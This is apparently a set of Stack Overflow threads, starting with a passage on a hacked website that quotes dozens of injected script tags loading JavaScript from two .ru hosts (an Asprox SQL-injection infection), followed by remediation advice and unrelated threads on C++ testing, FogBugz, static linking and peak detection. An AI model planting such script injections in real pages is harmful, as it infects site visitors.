src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script--&gt;\\n\\n', 'With a six word character password, he may have been brute forced.  That is more likely than his ftp being intercepted, but it could be that too.\\r\\n\\r\\nStart with a stronger password. (8 characters is still fairly weak)\\r\\n\\r\\nSee if this link to an internet security blog is helpful.', \"Try and gather as much information as you can. See if the host can give you a log showing all the FTP connections that were made to your account. You can use those to see if it was even an FTP connection that was used to make the change and possibly get an IP address.\\r\\n\\r\\nIf you're using a prepacked software like Wordpress, Drupal, or anything else that you didn't code there may be vulnerabilities in upload code that allows for this sort of modification. If it is custom built, double check any places where you allow users to upload files or modify existing files.\\r\\n\\r\\nThe second thing would be to take a dump of the site as-is and check everything for other modifications. It may just be one single modification they made, but if they got in via FTP who knows what else is up there.\\r\\n\\r\\nRevert your site back to a known good status and, if need be, upgrade to the latest version.\\r\\n\\r\\nThere is a level of return you have to take into account too. Is the damage worth trying to track the person down or is this something where you just live and learn and use stronger passwords?\", \"Is the site just plain static HTML? i.e. he hasn't managed to code himself an upload page that permits anyone driving by to upload compromised scripts/pages?\\r\\nWhy not ask webhost4life if they have any FTP logs available and report the issue to them. You never know, they may be quite receptive and find out for you exactly what happened? \\r\\nI work for a shared hoster and we always welcome reports such as these and can usually pinpoint the exact vector of attack based and advise as to where the customer went wrong.\", \"You mention your Dad was using a website publishing tool.\\r\\n\\r\\nIf the publishing tool publishes from his computer to the server, it may be the case that his local files are clean, and that he just needs to republish to the server.\\r\\n\\r\\nHe should see if there's a different login method to his server than plain FTP, though... that's not very secure because it sends his password as clear-text over the internet.\", 'I know this is a little late in the game, but the URL mentioned for the JavaScript is mentioned in a list of sites known to have been part of the ASPRox bot resurgence that started up in June (at least that\\'s when we were getting flagged with it). Some details about it are mentioned below:\\r\\n\\r\\nhttp://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx \\r\\n\\r\\nThe nasty thing about this is that effectively every varchar type field in the database is \"infected\" to spit out a reference to this URL, in which the the browser gets an tiny iframe that turns it into a bot. A basic SQL fix for this can be found here:\\r\\n\\r\\nhttp://aspadvice.com/blogs/programming_shorts/archive/2008/06/27/Asprox-Recovery.aspx\\r\\n\\r\\nThe scary thing though is that the virus looks to the system tables for values to infect and a lot of shared hosting plans also share the database space for their clients. So most likely it wasn\\'t even your dad\\'s site that was infected, but somebody else\\'s site within his hosting cluster that wrote some poor code and opened the door to SQL Injection attack.\\r\\n\\r\\nIf he hasn\\'t done so yet, I\\'d send an URGENT e-mail to their host and give them a link to that SQL code to fix the entire system. You can fix your own affected database tables, but most likely the bots that are doing the infection are going to pass right through that hole again and infect the whole lot.\\r\\n\\r\\nHopefully this gives you some more info to work with.\\r\\n\\r\\nEDIT: One more quick thought, if he\\'s using one of the hosts online design tools for building his website, all of that content is probably sitting in a column and was infected that way.', \"We had been hacked from same guys apparently! Or bots, in our case. They used SQL injection in URL on some old classic ASP sites that nobody maintain anymore. We found attacking IPs and blocked them in IIS. Now we must refactor all old ASP.\\nSo, my advice is to take a look at IIS logs first, to find if problem is in your site's code or server configuration.\\n\", 'Unplug the webserver without shutting it down to avoid shutdown scripts. Analyze the hard disk through another computer as a data drive and see if you can determine the culprit through log files and things of that nature. Verify that the code is safe and then restore it from a backup.\\n', \"This happened to a client of mine recently that was hosted on ipower.  I'm not sure if your hosting environment was Apache based, but if it was be sure to double check for .htaccess files that you did not create, particularly above the webroot and inside of image directories, as they tend to inject some nastiness there as well (they were redirecting people depending on where they came from in the refer).  Also check any that you did create for code that you did not write.\\n\", 'I have written a server side code removal tool in ASP.Net Here. Hope this will help you save your time to clean the hosted files :) This is much faster than cleaning the files via FTP or your control panel.\\n'], [\"I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\\n\\nAny links or tutorials would be appreciated.\\n\", \"I use UnitTest++.\\n\\nIn the years since I made this post the source has moved from SourceForge to github.  Also the example tutorial is now more agnostic - doesn't go into any configuration or project set up at all.\\n\\nI doubt it will still work for Visual Studio 6 as the project files are now created via CMake. If you still need the older version support you can get the last available version under the SourceForge branch.\\n\", \"I've used CppUnit with VS2005 and Eclipse. The wiki is very thorough (especially if you are familiar with JUnit).\\n\", \"I'm not 100% sure about VS2008, but I know that the Unit Testing framework that microsoft shipped in VS2005 as part of their Team Suite was only for .NET, not C++\\n\\nI've used CppUnit also and it was alright. Much the same as NUnit/JUnit/so on.\\n\\nIf you've used boost, they also have a unit testing library\\n\\nThe guys behind boost have some serious coding chops, so I'd say their framework should be pretty good, but it might not be the most user friendly :-)\\n\", 'The framework included with VS9 is .NET, but you can write tests in C++/CLI, so as long as you\\'re comfortable learning some .NET isms, you should be able to test most any C++ code.\\n\\nboost.test\\n and googletest\\nlook to be fairly similar, but adapted for slightly different uses. Both of these have a binary component, so you\\'ll need an extra project in your solution to compile and run the tests.\\n\\nThe framework we use is CxxTest, which is much lighter; it\\'s headers only, and uses a Perl (!) script to scrape test suite information from your headers (suites inherit from CxxTest::Base, all your test methods\\' names start with \"test\"). Obviously, this requires that you get Perl from one source or another, which adds overhead to your build environment setup.\\n', 'The unit tester for VS2008 is only for .NET code as far as I know.\\n\\nI used CppUnit on Vs2005 and found it to be pretty good. \\n\\nAs far as I remember, the setup was relatively painless, just make sure that in your testing projects the linker (Linker->Input->Additional Dependencies) includes cppunitd.lib. \\n\\nThen, #include &lt;cppunit/extensions/HelperMacros.h&gt; in your header\\n\\nYou can then follow the steps in http://cppunit.sourceforge.net/doc/1.11.6/cppunit_cookbook.html to get your test class working.\\n', \"I like the CxxTest as well for the same reasons. It's a header file only so no linking required. You aren't stuck with Perl as there is a Python runner as well. I will be reviewing the google library soon. The Boost stuff pulls in too much other baggage. \\n\", \"This page may help, it reviews quite a few C++ unit test frameworks:\\n\\n\\nCppUnit  \\nBoost.Test\\nCppUnitLite \\nNanoCppUnit\\nUnit++\\nCxxTest\\n\\n\\nCheck out CPPUnitLite or CPPUnitLite2. \\n\\nCPPUnitLite was created by Michael Feathers, who originally ported Java's JUnit to C++ as CPPUnit (CPPUnit tries mimic the development model of JUnit - but C++ lacks Java's features [e.g. reflection] to make it easy to use). \\n\\nCPPUnitLite attempts to make a true C++-style testing framework, not a Java one ported to C++. (I'm paraphrasing from Feather's Working Effectively with Legacy Code book). CPPUnitLite2 seems to be another rewrite, with more features and bug fixes.\\n\\nI also just stumbled across UnitTest++ which includes stuff from CPPUnitLite2 and some other framework.\\n\\nMicrosoft has released WinUnit. \\n\\nAlso checkout Catch or Doctest\\n\", \"Personally, I prefer WinUnit since it doesn't require me to write anything except for my tests (I build a .dll as the test, not an exe).  I just build a project, and point WinUnit.exe to my test output directory and it runs everything it finds.  You can download the WinUnit project here. (MSDN now requires you to download the entire issue, not the article.  WinUnit is included within.)\\n\", 'There is a way to test unmanaged C++ using the built in testing framework within Visual Studio 2008. If you create a C++ Test Project, using C++/CLI, you can then make calls to an unmanaged DLL. You will have to switch the Common Language Runtime support to /clr from /clr:safe if you want to test code that was written in unmanaged C++.\\n\\nI have step by step details on my blog here: http://msujaws.wordpress.com/2009/05/06/unit-testing-mfc-with-mstest/\\n', 'The tools that have been mentioned here are all command line tools. If you look for a more integrated solution, have a look at cfix studio, which is a Visual Studio AddIn for C/C++ unit testing . It is quite similar to TestDriven.Net, but for (unmanaged) C/C++ rather than .Net. \\n', 'Here is the approach I use to test the IIS URL Rewrite module at Microsoft (it is command-line based, but should work for VS too):\\n\\n\\nMake sure your header files are consumable by moving source code to cpp files and using forward declaration if needed.\\nCompile your code to test as library (.lib)\\nCreate your UnitTest project as C++ with CLR support.\\nInclude your header files.\\nInclude your .lib files.\\nAdd a reference to Microsoft.VisualStudio.QualityTools.UnitTestFramework.dll\\nUse a really small class for declaring your unit test and jump from managed to C++/Native code like this (may have typos):\\n\\n\\nHere is an example:\\n\\n// Example\\n#include \"stdafx.h\"\\n#include \"mstest.h\"\\n\\n// Following code is native code.\\n#pragma unmanaged\\nvoid AddTwoNumbersTest() {\\n  // Arrange\\n  Adder yourNativeObject;\\n  int expected = 3;\\n  int actual;\\n  // Act\\n  actual = yourNativeObject.Add(1, 2);\\n  // Assert\\n  Assert::AreEqual(expected, actual, L\"1 + 2 != 3\");\\n}\\n\\n// Following code is C++/CLI (Managed)\\n#pragma managed\\nusing namespace Microsoft::VisualStudio::TestTools::UnitTesting;\\n[TestClass]\\npublic ref class TestShim {\\npublic:\\n  [TestMethod]\\n  void AddTwoNumbersTest() {\\n     // Just jump to C++ native code (above)\\n     ::AddTwoNumbersTest();\\n  }\\n};\\n\\n\\nWith this approach, people don\\'t have to learn too much C++/CLI stuff, all the real test will be done in C++ native and the TestShim class will be used to \\'publish\\' the test to MSTest.exe (or make it visible).\\n\\nFor adding new tests you just declare a new [TestMethod] void NewTest(){::NewTest();} method and a new void NewTest() native function. No macros, no tricks, straighforward.\\n\\nNow, the  heade file is optionally, but it can be used to expose the Assert class\\' methods with C++ native signatures (e.g. wchar_t* instead of Stirng^), so it can you can keep it close to C++ and far from C++/CLI:\\n\\nHere is an example:\\n\\n// Example\\n#pragma once\\n#pragma managed(push, on)\\nusing namespace System;\\nclass Assert {\\npublic:\\n    static void AreEqual(int expected, int actual) {\\n        Microsoft::VisualStudio::TestTools::UnitTesting::Assert::AreEqual(expected, actual);\\n    }\\n\\n    static void AreEqual(int expected, int actual, PCWSTR pszMessage) {\\n        Microsoft::VisualStudio::TestTools::UnitTesting::Assert::AreEqual(expected, actual, gcnew String(pszMe\\nssage));\\n    }\\n\\n    template&lt;typename T&gt;\\n    static void AreEqual(T expected, T actual) {\\n        Microsoft::VisualStudio::TestTools::UnitTesting::Assert::AreEqual(expected, actual);\\n    }\\n\\n    // Etcetera, other overloads...\\n}\\n#pragma managed(pop)\\n\\n\\nHTH\\n', 'I was suffering to implement unit test for unmanaged C++ application in windows environment with Visual Studio. So I manage to overcome and wrote a post as a step by step guidance to unmanaged C++ Application Unit Test. Hope It may help you.\\n\\nhttp://codeketchup.blogspot.sg/2012/12/unit-test-for-unmanaged-c-in-visual.html \\n'], [\"Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\\r\\n\\r\\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\\r\\n\\r\\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)\", \"I use it, especially since the hosted Version of FugBugz is free for up to 2 people. I found it a lot nicer than paper as I'm working on multiple projects, and my paper tends to get rather messy once you start making annotations or if you want to re-organize and shuffle tasks around, mark them as complete only to see that they are not complete after all...\\n\\nPlus, the Visual Studio integration is really neat, something paper just cannot compete with. Also, if you lay the project to rest for 6 months and come back, all your tasks and notes are still there, whereas with paper you may need to search all the old documents and notes again, if you did not discard it.\\n\\nBut that is just the point of view from someone who is not really good at staying organized :-) If you are a really tidy and organized person, paper may work better for you than it does for me.\\n\\nBonus suggestion: Run Fogbugz on a second PC (or a small Laptop like the eeePC) so that you always have it at your fingertips. The main problem with Task tracking programs - be it FogBugz, Outlook, Excel or just notepad - is that they take up screen space, and my two monitors are usually full with Visual Studio, e-Mail, Web Browsers, some Notepads etc.\\n\", \"I use it as well and quite frankly wouldn't want to work without it.\\r\\n\\r\\nI've always had some kind of issue tracker available for the projects I work on and thus am quite used to updating it. With FB6 the process is now even better.\\r\\n\\r\\nSince FB also integrates with Subversion, the source control tool I use for my projects, the process is really good and I have two-way links between the two systems now. I can click on a case number in the Subversion logs and go to the case in FB, or see the revisions bound to a case inside FB.\", \"When I was working for myself doing my consulting business I signed up for a hosted account and honestly I couldn't have done without it. \\r\\nWhat I liked most about it was it took 30 seconds to sign up for an account and I was then able to integrate source control using sourcegear vault (which is an excellent source control product and free for single developers) set up projects, clients, releases and versions and monitor my progress constantly.\\r\\nOne thing that totally blew me away was that I ended up completely abandoning outlook for all work related correspondence. I could manage all my client interactions from within fogbugz and it all just worked amazingly well.\\r\\nIn terms of overhead, one of the nice things you could do was turn anything into a case. Anything that came up in your mind while you were coding, you simply created a new email, sent it to fogbugz and it was instantly added as an item for review later.\\r\\nI would strongly recommend you get yourself one of the hosted accounts and give it a whirl\", 'In addition to the benefits already mentioned, another nice feature of using FogBugz is BugzScout, which you can use to report errors from your app and log them into FogBugz automatically.  If you\\'re a one person team, chances are there are some bugs in your code you\\'ve never seen during your own testing, so it\\'s nice to have those bugs found \"in the wild\" automatically reported and logged for you.', 'Go to http://www.fogbugz.com/ then at the bottom under \"Try It\", sign up.\\r\\n\\r\\nunder Settings =&gt; Your FogBugz Hosted Account, it should either already say \"Payment Information:    Using Student and Startup Edition.\" or there should be some option/link to turn on the Student and Startup Edition.\\r\\n\\r\\nAnd yes, it\\'s not only for Students and Startups, I asked their support :-)\\r\\n\\r\\nDisclaimer: I\\'m not affiliated with FogCreek and Joel did not just deposit money in my account.', \"I think it's great that Joel et al. let people use FogBugs hosted for free on their own.  It's a great business strategy, because the users become fans (it is great software after all), and then they recommend it to their businesses or customers.\\n\", \"Yea FogBugz is great for process-light, quick and easy task management.  It seems especially well suited for soloing, where you don't need or want a lot of complexity in that area.  \\n\\nBy the way, if you want to keep track of what you're doing at the computer all day, check out TimeSprite, which integrates with FogBugz.  It's a Windows app that logs your active window and then categorizes your activity based on the window title / activity type mappings you define as you go.  (You can also just tell it what you're working on.)  And if you're a FogBugz user, you can associate your work with a FogBugz case, and it will upload your time intervals for that case.  This makes accurate recording of elapsed time pretty painless and about as accurate as you can get, which in turn improves FogBugz predictive powers in its evidence-based scheduling.  Also, when soloing, I find that such specific logging of my time keeps me on task, in the way a meandering manager otherwise might. (I'm not affiliated with TimeSprite in any way.)\\n\"], [\"I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.\\r\\n\\r\\nWithout doing this you get the error message that the application configuration is not correct and to reinstall.  \", \"You'd be looking to static link (as opposed to dynamically link)\\r\\n\\r\\nI'm not sure how many of the MS redistributables statically link in.\", \"If you are looking to find out which dll's your target machine is missing then use depends.exe which used to come with MSDev, but can also be found here. Testing this on a few target machines should tell you which dll's you need to package with your application.\", 'You need to set the run-time library (Under C/C++ -&gt; Code Generation) for ALL projects to static linkage, which correlates to the following default building configurations:\\r\\n\\r\\nMultithreaded Debug/Release\\r\\nSinglethreaded Debug/Release\\r\\nAs opposed to the \"DLL\" versions of those libraries.\\r\\nEven if you do that, depending on the libraries you\\'re using, you might have to install a Merge Module/framework/etc. It depends on whether static LIB versions of your dependencies are available.', '\\nChoose Project -> Properties\\nSelect Configuration -> General\\nIn the box for how you should link MFC, choose to statically link it.\\nChoose Linker -> Input.  Under Additional Dependencies, add any libraries you need your app to statically link in.\\n\\n\\nFor more info, see this article: http://www.geekadmin.com/?p=34\\n', \"Be aware that Microsoft do not recommend that you static link the runtime into your project, as this prevents it from being serviced by windows update to fix critical security bugs. There are also potential problems if you are passing memory between your main .exe and .dll files as if each of these static links the runtime you can end up with malloc/free mismatch problems.\\n\\nYou can include the DLLs with the executable, without compiling them into the .exe and without running the redist tool - this is what I do and it seems to work fine. \\n\\nThe only fly in the ointment is that you need to include the files twice if you're distributing for a wide range of Windows versions - newer OSs need the files in manifest-defined directories, and older ones want all the files in the program directory.\\n\"], ['We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\\n\\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\\n\\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\\n\\n\\n\\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code. \\n', 'You could try signal averaging, i.e. for each point, average the value with the surrounding 3 or more points. If the noise blips are huge, then even this may not help.\\r\\n\\r\\nI realise that this was language agnostic, but guessing that you are using LabView, there are lots of pre-packaged signal processing VIs that come with LabView that you can use to do smoothing and noise reduction. The NI forums are a great place to get more specialised help on this sort of thing.', 'You could apply some Standard Devision to your logic and take notice of peaks over x%.', \"I think you want to cross-correlate your signal with an expected, exemplar signal. But, it has been such a long time since I studied signal processing and even then I didn't take much notice.\", \"I don't know very much about instrumentation, so this might be totally impractical, but then again it might be a helpful different direction.  If you know how the readings can fail, and there is a certain interval between peaks given such failures, why not do gradient descent at each interval.  If the descent brings you back to an area you've searched before, you can abandon it.  Depending upon the shape of the sampled surface, this also might help you find peaks faster than search.\", \"This problem has been studied in some detail. \\n\\nThere are a set of very up-to-date implementations in the TSpectrum* classes of ROOT (a nuclear/particle physics analysis tool). The code works in one- to three-dimensional data.\\n\\nThe ROOT source code is available, so you can grab this implementation if you want.\\n\\nFrom the TSpectrum class documentation:\\n\\nThe algorithms used in this class have been published in the following references:\\n\\n\\n  [1] M.Morhac et al.: Background\\n  elimination methods for\\n  multidimensional coincidence gamma-ray\\n  spectra. Nuclear Instruments and\\n  Methods in Physics Research A 401\\n  (1997) 113-\\n  132.\\n  \\n  [2]  M.Morhac et al.: Efficient one- and two-dimensional Gold\\n  deconvolution and its application to\\n  gamma-ray spectra decomposition.\\n  Nuclear Instruments and Methods in\\n  Physics Research A 401 (1997) 385-408.\\n  \\n  [3]  M.Morhac et al.: Identification of peaks in\\n  multidimensional coincidence gamma-ray\\n  spectra. Nuclear Instruments and\\n  Methods in Research Physics A \\n  443(2000), 108-125.\\n\\n\\nThe papers are linked from the class documentation for those of you who don't have a NIM online subscription.\\n\\n\\n\\nThe short version of what is done is that the histogram flattened to eliminate noise, and then local maxima are detected by brute force in the flattened histogram. \\n\", 'This method is basically from David Marr\\'s  book \"Vision\"\\n\\nGaussian blur your signal with the expected width of your peaks.\\nthis gets rid of noise spikes and your phase data is undamaged.\\n\\nThen edge detect (LOG will do)\\n\\nThen your edges were the edges of features (like peaks).\\nlook between edges  for peaks, sort peaks by size, and you\\'re done.\\n\\nI have used variations on this and they work very well.\\n', 'Is there a qualitative difference between the desired peak and the unwanted second peak? If both peaks are \"sharp\" -- i.e. short in time duration -- when looking at the signal in the frequency domain (by doing FFT) you\\'ll get energy at most bands. But if the \"good\" peak reliably has energy present at frequencies not existing in the \"bad\" peak, or vice versa, you may be able to automatically differentiate them that way.\\n', 'There are lots and lots of classic peak detection methods, any of which might work.  You\\'ll have to see what, in particular, bounds the quality of your data.  Here are basic descriptions:\\n\\n\\nBetween any two points in your data, (x(0),y(0)) and (x(n),y(n)), add up y(i+1)-y(i) for 0 &lt;= i &lt; n and call this T (\"travel\") and set R (\"rise\") to y(n)- y(0) + k for suitably small k.  T/R > 1 indicates a peak.  This works OK if large travel due to noise is unlikely or if noise distributes symmetrically around a base curve shape.  For your application, accept the earliest peak with a score above a given threshold, or analyze the curve of travel per rise values for more interesting properties.\\nUse matched filters to score similarity to a standard peak shape (essentially, use a normalized dot-product against some shape to get a cosine-metric of similarity)\\nDeconvolve against a standard peak shape and check for high values (though I often find 2 to be less sensitive to noise for simple instrumentation output).\\nSmooth the data and check for triplets of equally spaced points where, if x0 &lt; x1 &lt; x2, y1 > 0.5*(y0+y2), or check Euclidean distances like this:  D((x0,y0),(x1,y1)) + D((x1,y1),(x2,y2)) > D((x0,y0),(x2,y2)), which relies on the triangle inequality.  Using simple ratios will again provide you a scoring mechanism.\\nFit a very simple 2-gaussian mixture model to your data (for example, Numerical Recipes has a nice ready-made chunk of code).  Take the earlier peak.  This will deal correctly with overlapping peaks.\\nFind the best match in the data to a simple Gaussian, Cauchy, Poisson, or what-have-you curve.  Evaluate this curve over a broad range and subtract it from a copy of the data after noting it\\'s peak location.  Repeat.  Take the earliest peak whose model parameters (standard deviation probably, but some applications might care about kurtosis or other features) meet some criterion.  Watch out for artifacts left behind when peaks are subtracted from the data.\\nBest match might be determined by the kind of match scoring suggested in #2 above.\\n\\n\\nI\\'ve done what you\\'re doing before:  finding peaks in DNA sequence data, finding peaks in derivatives estimated from measured curves, and finding peaks in histograms.\\n\\nI encourage you to attend carefully to proper baselining.  Wiener filtering or other filtering or simple histogram analysis is often an easy way to baseline in the presence of noise.\\n\\nFinally, if your data is typically noisy and you\\'re getting data off the card as unreferenced single-ended output (or even referenced, just not differential), and if you\\'re averaging lots of observations into each data point, try sorting those observations and throwing away the first and last quartile and averaging what remains.  There are a host of such outlier elimination tactics that can be really useful.\\n', \"I would like to contribute to this thread an algorithm that I have developed myself:\\n\\nThis algorithm signals when the data points are a specified number of standard deviations away from the moving mean. However, when a signal is detected, subsequent data points that are also a signal (so significantly away from the moving mean), will not corrupt the signal threshold. That is, the algorithm creates a  'new mean' and 'new st.dev.' in which the data points that are signals are not used. Therefore, the threshold remains uncorrupted and is able to correctly identify future signals too, without loss of performance. This works extremely well!\\n\\nIn order to display the power of this robust algorithm, I have prepared a demo in which the user can specify its own data. This little demo displays both how the algorithm works and why it is so useful. \\n\\n\\n\\nThe full working Matlab code for this demo:\\n\\nfunction [] = RobustDetectionDemo()\\n\\n%% SPECIFICATIONS\\nLAG         = 10;       % lag for the moving mean and moving st. dev.\\nDIFF        = 3.5;      % number of st. dev. from the mean to signal\\nINFLUENCE   = 0.0;      % when signal: how much is mean/st.dev. influenced?\\n                            % or e.g. 0.05/0.1 for influencing\\nDIRECTION   = 'both';   % signal when 'up'/'down'/'both' from the mean\\n\\n%%\\nfigure(1);\\nsubplot(2,2,1);\\ntitle('Draw 30 data points');\\nylim([0 5]); xlim([0 50]);\\n[x,y] = ginputExtra_realtime(30, true, LAG, DIFF, INFLUENCE, DIRECTION);\\nend\\n\\nfunction [x y] = ginputExtra_realtime(n,booText, LAG, DIFF, INFLUENCE, DIRECTION)\\nif booText == true\\n    bText = booText;\\nelse\\n    bText = false;\\nend\\nH = gca;\\nset(H, 'YLimMode', 'manual'); set(H, 'XLimMode', 'manual');\\nset(H, 'YLim', get(H,'YLim')); set(H, 'XLim', get(H,'XLim'));\\nnumPoints = n; xg = []; yg = [];\\nfor i=1:numPoints\\n    [xi yi] = ginput(1);\\n    xg = [xg xi]; yg = [yg yi];\\n    if i == 1\\n        hold on;\\n        plot(H, xg(i),yg(i),'ro');\\n        if bText text(xg(i),yg(i),num2str(i),'FontSize',12); end\\n    else\\n        plot(xg([i-1:i]),yg([i-1:i]),'r');\\n        if bText text(xg(i),yg(i),num2str(i),'FontSize',12); end\\n        if length(xg) &gt; LAG\\n            robustMA(xg, yg, LAG, DIFF, INFLUENCE, DIRECTION);\\n        end\\n    end    \\nend\\nhold off;\\nx = xg; y = yg;\\nend\\n\\nfunction [] = robustMA( x, y, lag, diff, influence, direction)\\n\\n% robustMA  :: Signal detection algorithm ::\\n% Author: Jean-Paul van Brakel\\n\\n% ************************************************************ %\\n% TO BE USED FOR: *determining significant and sudden changes*\\n% ************************************************************ %\\n\\n% x     = x-axis data\\n% y     = y-axis data\\n% lag   = lag of moving mean and moving st.dev.\\n% diff  = number of st.dev. away from the mean in order to give a signal\\n% influence = number between 0 and 1 that indicates influence of signals\\n% direction = 'up'/'down'/'both' which means the following:\\n%               - 'up'  : only signal for deviations ABOVE the mean\\n%               - 'down': only signal for deviations BELOW the mean\\n%               - 'both': signal for deviations ABOVE and BELOW the mean\\n\\np = y;\\noutputmean  = tsmovavg(y,'s',lag,2);\\noutputstdev = movingstd(y,lag,'backward');\\n\\nnewMean  = zeros(1, length(outputmean));\\nnewStdev = zeros(1, length(outputmean));\\nsignals  = ones(1, length(outputmean));\\n\\nnewMean(lag-1)  = outputmean(lag);\\nnewStdev(lag-1) = outputstdev(lag);\\n\\nfor i = lag:length(outputmean)\\n   if strcmp(direction, 'up')\\n       if (p(i) &gt; newMean(i-1)+diff*newStdev(i-1))\\n          newMean(i)  = (newMean(i-1)  + influence*p(i))/(1+influence);\\n          newStdev(i) = (newStdev(i-1) + influence*sqrt((p(i)-newMean(i-1))^2))/(1+influence);\\n          signals(i)  = 2;\\n       else\\n          newMean(i)  = (newMean(i-1)+p(i))/2;\\n          newStdev(i) = (newStdev(i-1) + sqrt((p(i)-newMean(i-1))^2))/2; \\n          signals(i)  = 1;\\n       end\\n   elseif strcmp(direction, 'down')\\n       if (p(i) &lt; newMean(i-1)-diff*newStdev(i-1))\\n          newMean(i)  = (newMean(i-1)  + influence*p(i))/(1+influence);\\n          newStdev(i) = (newStdev(i-1) + influence*sqrt((p(i)-newMean(i-1))^2))/(1+influence);\\n          signals(i)  = 2;\\n       else\\n          newMean(i)  = (newMean(i-1)+p(i))/2;\\n          newStdev(i) = (newStdev(i-1) + sqrt((p(i)-newMean(i-1))^2))/2; \\n          signals(i)  = 1;\\n       end\\n   elseif strcmp(direction, 'both')\\n       if (p(i) &gt; newMean(i-1)+diff*newStdev(i-1) || ...\\n           p(i) &lt; newMean(i-1)-diff*newStdev(i-1))\\n          newMean(i)  = (newMean(i-1)  + influence*p(i))/(1+influence);\\n          newStdev(i) = (newStdev(i-1) + influence*sqrt((p(i)-newMean(i-1))^2))/(1+influence);\\n          signals(i)  = 2;\\n       else\\n          newMean(i)  = (newMean(i-1)+p(i))/2;\\n          newStdev(i) = (newStdev(i-1) + sqrt((p(i)-newMean(i-1))^2))/2; \\n          signals(i)  = 1;\\n       end\\n   end\\nend\\n\\nfigure(1);\\nsubplot(2,2,2);\\nhold on;\\ntitle('Algorithm output');\\narea(x, newMean+diff*newStdev, 'FaceColor', [0.9 0.9 0.9], 'EdgeColor', 'none');\\narea(x, newMean, 'FaceColor', [1 1 1], 'EdgeColor', 'none');\\narea(x, newMean, 'FaceColor', [0.9 0.9 0.9], 'EdgeColor', 'none');\\narea(x, newMean-diff*newStdev, 'FaceColor', [1 1 1], 'EdgeColor', 'none');\\nplot(x, p, ':r', 'LineWidth', 1, 'Color', 'black');\\nplot(x, newMean, 'LineWidth', 2, 'Color', 'red');\\nplot(x, newMean+newStdev, 'LineWidth', 2, 'Color', 'green');\\nplot(x, newMean-newStdev, 'LineWidth', 2, 'Color', 'green');\\nxlim([0 50]);   ylim([0 5])\\nhold off;\\nsubplot(2,2,4);\\nhold on;\\ntitle('Signal output');\\nstairs(x, signals, 'LineWidth', 2, 'Color', 'blue');\\nylim([0 3]);    xlim([0 50]);\\nhold off;\\n\\nend\\n\\nfunction s = movingstd(x,k,windowmode)\\n% movingstd: efficient windowed standard deviation of a time series\\n% usage: s = movingstd(x,k,windowmode)\\n%\\n% Movingstd uses filter to compute the standard deviation, using\\n% the trick of std = sqrt((sum(x.^2) - n*xbar.^2)/(n-1)).\\n% Beware that this formula can suffer from numerical problems for\\n% data which is large in 